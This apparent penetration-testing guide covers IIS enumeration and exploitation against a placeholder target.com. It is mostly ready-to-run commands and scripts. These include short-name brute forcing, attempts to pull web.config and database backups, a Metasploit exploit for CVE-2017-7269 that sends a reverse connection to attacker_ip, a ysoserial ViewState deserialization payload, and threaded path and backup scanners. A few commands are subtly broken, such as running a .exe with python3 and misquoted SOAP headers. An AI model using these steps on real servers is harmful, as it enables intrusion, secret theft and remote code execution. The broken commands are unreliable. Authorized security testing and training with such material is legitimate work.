# IIS Enumeration and Windows Server Exploitation

## Overview
This document covers advanced techniques for enumerating IIS web servers, extracting paths, attempting backup downloads, exploiting web services, and leveraging archived content for reconnaissance.

## IIS Server Enumeration

### Basic IIS Fingerprinting
**Objective**: Identify IIS version and configuration details

**Techniques**:
```bash
# Nmap IIS enumeration
nmap -sV -p 80,443 --script http-iis-webdav-vuln,http-iis-short-name-brute target_ip

# HTTP headers analysis
curl -I http://target.com
curl -X OPTIONS http://target.com

# IIS version detection
nmap -p 80,443 --script http-server-header target_ip
whatweb http://target.com

# WebDAV detection
davtest -url http://target.com
cadaver http://target.com
```

### IIS Short Name Enumeration
**Objective**: Exploit IIS short name vulnerability to discover hidden files and directories

**Techniques**:
```bash
# IIS short name scanner
java -jar iis_shortname_scanner.jar 2 20 http://target.com

# Manual short name enumeration
curl "http://target.com/aspnet~1.*"
curl "http://target.com/admin~1.*"
curl "http://target.com/backup~1.*"

# Automated short name brute force
for i in {a..z}; do
    for j in {a..z}; do
        curl -s "http://target.com/${i}${j}~1.*" | grep -v "404"
    done
done

# IIS tilde enumeration with Burp Suite
# Send request: GET /admin~1.* HTTP/1.1
# Look for different response codes/lengths
```

### IIS Path Discovery
**Objective**: Discover hidden paths and directories on IIS servers

**Common IIS Paths**:
```bash
# Default IIS paths
/iisadmin/
/scripts/
/msadc/
/iissamples/
/iishelp/
/aspnet_client/
/_vti_bin/
/_vti_pvt/
/_private/
/exchange/
/exchweb/
/public/
/mailroot/
/inetpub/
/wwwroot/

# ASP.NET specific paths
/bin/
/App_Data/
/App_Code/
/App_GlobalResources/
/App_LocalResources/
/App_WebReferences/
/App_Browsers/

# SharePoint paths
/_layouts/
/_catalogs/
/_vti_bin/
/sites/
/personal/
```

**Automated Path Discovery**:
```bash
# Gobuster with IIS wordlist
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x asp,aspx,config,bak

# Dirb with IIS extensions
dirb http://target.com /usr/share/wordlists/dirb/common.txt -X .asp,.aspx,.config,.bak,.old

# Custom IIS wordlist
ffuf -w iis_paths.txt -u http://target.com/FUZZ -fc 404

# Recursive directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -r -x asp,aspx
```

### IIS Configuration File Discovery
**Objective**: Locate and extract IIS configuration files

**Configuration Files**:
```bash
# Web.config files
/web.config
/Web.config
/WEB.CONFIG
/bin/web.config
/app_data/web.config
/admin/web.config
/test/web.config
/backup/web.config

# ApplicationHost.config
/windows/system32/inetsrv/config/applicationhost.config
/inetpub/temp/appPools/applicationhost.config

# Machine.config
/windows/microsoft.net/framework/v4.0.30319/config/machine.config
/windows/microsoft.net/framework64/v4.0.30319/config/machine.config

# IIS metabase files
/windows/system32/inetsrv/metabase.xml
/windows/system32/inetsrv/mbschema.xml
```

**Configuration File Extraction**:
```bash
# Direct access attempts
curl http://target.com/web.config
curl http://target.com/Web.config
curl http://target.com/WEB.CONFIG

# Backup file attempts
curl http://target.com/web.config.bak
curl http://target.com/web.config.old
curl http://target.com/web.config.backup
curl http://target.com/web.config.txt

# Case sensitivity bypass
curl http://target.com/WEB.CONFIG
curl http://target.com/Web.Config
curl http://target.com/web.CONFIG
```

## Backup File Discovery and Download

### Common Backup Patterns
**Objective**: Identify and download backup files from IIS servers

**Backup File Patterns**:
```bash
# Common backup extensions
.bak
.backup
.old
.orig
.copy
.tmp
.save
.1
.2
.zip
.rar
.tar.gz

# Backup naming conventions
filename.ext.bak
filename.bak.ext
filename_backup.ext
filename-backup.ext
filename.old
backup_filename.ext
old_filename.ext
```

**Automated Backup Discovery**:
```bash
# Backup file enumeration
for file in index.asp default.aspx login.asp admin.aspx; do
    for ext in bak backup old orig copy tmp save; do
        curl -s "http://target.com/${file}.${ext}" | grep -v "404"
    done
done

# Directory backup enumeration
for dir in admin backup old temp; do
    curl -s "http://target.com/${dir}/" | grep -v "404"
done

# Automated backup scanner
python3 backup_scanner.py -u http://target.com -w wordlist.txt
```

### Database Backup Discovery
**Objective**: Locate database backup files

**Database Backup Patterns**:
```bash
# SQL Server backups
/backup/database.bak
/backups/db.bak
/temp/backup.bak
/data/database.mdf
/data/database.ldf

# Access database backups
/database.mdb
/db.mdb
/backup.mdb
/data.mdb

# MySQL backups
/backup/database.sql
/dumps/db.sql
/mysql/backup.sql
```

## Web Services Exploitation

### ASMX Web Services
**Objective**: Enumerate and exploit ASP.NET web services

**ASMX Enumeration**:
```bash
# ASMX service discovery
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x asmx

# ASMX service enumeration
curl http://target.com/service.asmx
curl http://target.com/service.asmx?WSDL

# Common ASMX paths
/webservice.asmx
/service.asmx
/api.asmx
/ws.asmx
/services/service.asmx
/webservices/service.asmx
```

**ASMX Exploitation**:
```bash
# SOAP request enumeration
curl -X POST http://target.com/service.asmx -H "Content-Type: text/xml; charset=utf-8" -H "SOAPAction: "http://tempuri.org/GetData"" -d '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetData xmlns="http://tempuri.org/"></GetData></soap:Body></soap:Envelope>'

# WSDL analysis
wsdl2java http://target.com/service.asmx?WSDL
soapui http://target.com/service.asmx?WSDL
```

### WCF Services
**Objective**: Enumerate and exploit Windows Communication Foundation services

**WCF Enumeration**:
```bash
# WCF service discovery
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x svc

# WCF metadata enumeration
curl http://target.com/service.svc
curl http://target.com/service.svc?wsdl
curl http://target.com/service.svc/mex

# Common WCF paths
/service.svc
/wcfservice.svc
/api.svc
/services/service.svc
```

### REST API Enumeration
**Objective**: Discover and enumerate REST APIs on IIS

**REST API Discovery**:
```bash
# API endpoint discovery
gobuster dir -u http://target.com -w api_wordlist.txt -x json,xml

# Common API paths
/api/
/api/v1/
/api/v2/
/rest/
/webapi/
/service/
/services/

# API documentation discovery
curl http://target.com/api/docs
curl http://target.com/swagger
curl http://target.com/api/swagger
curl http://target.com/api-docs
```

## Archive.org Reconnaissance

### Wayback Machine Enumeration
**Objective**: Use archive.org to discover historical content and hidden paths

**CDX API Usage**:
```bash
# Basic CDX search
curl "https://web.archive.org/cdx/search/cdx?url=target.com&matchType=domain&fl=original&collapse=urlkey&limit=100000"

# Filtered CDX search
curl "https://web.archive.org/cdx/search/cdx?url=target.com&matchType=domain&fl=original,timestamp&collapse=urlkey&limit=100000&filter=statuscode:200"

# Subdomain discovery
curl "https://web.archive.org/cdx/search/cdx?url=*.target.com&matchType=domain&fl=original&collapse=urlkey&limit=100000"

# File type filtering
curl "https://web.archive.org/cdx/search/cdx?url=target.com&matchType=domain&fl=original&collapse=urlkey&limit=100000&filter=mimetype:text/html"
```

**Advanced Archive Reconnaissance**:
```bash
# Extract unique paths
curl -s "https://web.archive.org/cdx/search/cdx?url=target.com&matchType=domain&fl=original&collapse=urlkey&limit=100000" | cut -d'/' -f4- | sort -u

# Extract parameters
curl -s "https://web.archive.org/cdx/search/cdx?url=target.com&matchType=domain&fl=original&collapse=urlkey&limit=100000" | grep -o '?[^&]*' | sort -u

# Extract file extensions
curl -s "https://web.archive.org/cdx/search/cdx?url=target.com&matchType=domain&fl=original&collapse=urlkey&limit=100000" | grep -o '\.[a-zA-Z0-9]*' | sort -u

# Historical admin panels
curl -s "https://web.archive.org/cdx/search/cdx?url=target.com&matchType=domain&fl=original&collapse=urlkey&limit=100000" | grep -i admin
```

**Automated Archive Analysis**:
```python
#!/usr/bin/env python3
import requests
import urllib.parse

def wayback_enum(domain):
    url = f"https://web.archive.org/cdx/search/cdx?url={domain}&matchType=domain&fl=original&collapse=urlkey&limit=100000"
    
    try:
        response = requests.get(url)
        urls = response.text.strip().split('\n')
        
        # Extract unique paths
        paths = set()
        for url in urls:
            parsed = urllib.parse.urlparse(url)
            if parsed.path:
                paths.add(parsed.path)
        
        # Extract parameters
        params = set()
        for url in urls:
            parsed = urllib.parse.urlparse(url)
            if parsed.query:
                for param in parsed.query.split('&'):
                    if '=' in param:
                        params.add(param.split('=')[0])
        
        return list(paths), list(params)
    
    except Exception as e:
        print(f"Error: {e}")
        return [], []

# Usage
domain = "target.com"
paths, params = wayback_enum(domain)
print("Discovered paths:", paths[:20])
print("Discovered parameters:", params[:20])
```

## IIS Vulnerability Exploitation

### IIS 6.0 WebDAV Vulnerability (CVE-2017-7269)
**Objective**: Exploit buffer overflow in IIS 6.0 WebDAV

**Exploitation**:
```bash
# Metasploit exploitation
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS target_ip
set LHOST attacker_ip
exploit

# Manual exploitation
python3 iis6_webdav_exploit.py target_ip
```

### IIS Short Name Vulnerability
**Objective**: Exploit IIS tilde enumeration vulnerability

**Exploitation**:
```bash
# IIS short name scanner
java -jar IIS_shortname_Scanner.jar 2 20 http://target.com

# Manual enumeration
curl "http://target.com/admin~1.*"
curl "http://target.com/backup~1.*"
curl "http://target.com/config~1.*"
```

### ASP.NET ViewState Exploitation
**Objective**: Exploit insecure ViewState implementations

**ViewState Analysis**:
```bash
# ViewState decoder
python3 viewstate_decoder.py -v "viewstate_value"

# ViewState exploitation
python3 ysoserial.net.exe -f ViewState -g TypeConfuseDelegate -c "cmd /c calc" --path="/page.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="key"
```

### IIS Application Pool Exploitation
**Objective**: Exploit misconfigured application pools

**Application Pool Enumeration**:
```bash
# Application pool discovery
curl http://target.com/aspnet_client/
curl http://target.com/App_Data/
curl http://target.com/bin/

# Configuration file access
curl http://target.com/web.config
curl http://target.com/global.asax
```

## Advanced IIS Reconnaissance Tools

### Custom IIS Scanner
```python
#!/usr/bin/env python3
import requests
import threading
from urllib.parse import urljoin

class IISScanner:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.found_paths = []
        
    def check_path(self, path):
        try:
            url = urljoin(self.target, path)
            response = self.session.get(url, timeout=5)
            
            if response.status_code == 200:
                self.found_paths.append((path, response.status_code, len(response.content)))
                print(f"[+] Found: {path} ({response.status_code})")
            elif response.status_code in [301, 302, 403]:
                self.found_paths.append((path, response.status_code, len(response.content)))
                print(f"[!] Interesting: {path} ({response.status_code})")
                
        except Exception as e:
            pass
    
    def scan_common_paths(self):
        common_paths = [
            '/web.config', '/Web.config', '/WEB.CONFIG',
            '/global.asax', '/Global.asax',
            '/bin/', '/App_Data/', '/App_Code/',
            '/admin/', '/administrator/', '/management/',
            '/backup/', '/backups/', '/old/', '/temp/',
            '/test/', '/testing/', '/dev/', '/development/',
            '/api/', '/webapi/', '/service/', '/services/',
            '/upload/', '/uploads/', '/files/',
            '/logs/', '/log/', '/reports/',
            '/iisadmin/', '/scripts/', '/msadc/'
        ]
        
        threads = []
        for path in common_paths:
            thread = threading.Thread(target=self.check_path, args=(path,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
    
    def scan_backup_files(self):
        base_files = ['index', 'default', 'login', 'admin', 'web.config']
        extensions = ['asp', 'aspx', 'config']
        backup_exts = ['bak', 'backup', 'old', 'orig', 'copy', 'tmp']
        
        for base in base_files:
            for ext in extensions:
                for backup_ext in backup_exts:
                    path = f"/{base}.{ext}.{backup_ext}"
                    self.check_path(path)

# Usage
scanner = IISScanner("http://target.com")
scanner.scan_common_paths()
scanner.scan_backup_files()
```

### IIS Log Analysis
**Objective**: Analyze IIS logs for reconnaissance

**Log File Locations**:
```bash
# Default IIS log locations
C:\inetpub\logs\LogFiles\W3SVC1\
C:\Windows\System32\LogFiles\W3SVC1\
C:\inetpub\logs\LogFiles\FTPSVC1\

# Log analysis commands
# Extract unique IP addresses
awk '{print $9}' *.log | sort -u

# Extract requested URLs
awk '{print $5}' *.log | sort -u

# Extract user agents
awk -F'"' '{print $6}' *.log | sort -u

# Extract error codes
awk '{print $11}' *.log | sort | uniq -c
```

## Conclusion

This comprehensive guide covers advanced IIS enumeration and Windows server exploitation techniques including:

- **IIS fingerprinting and version detection**
- **Short name vulnerability exploitation**
- **Path and directory discovery**
- **Configuration file extraction**
- **Backup file discovery and download**
- **Web services enumeration and exploitation**
- **Archive.org reconnaissance for historical data**
- **Advanced vulnerability exploitation**
- **Custom scanning and analysis tools**

These techniques provide a thorough approach to IIS server assessment and should be used responsibly in authorized penetration testing scenarios.

Remember: Thorough enumeration is the foundation of successful exploitation.
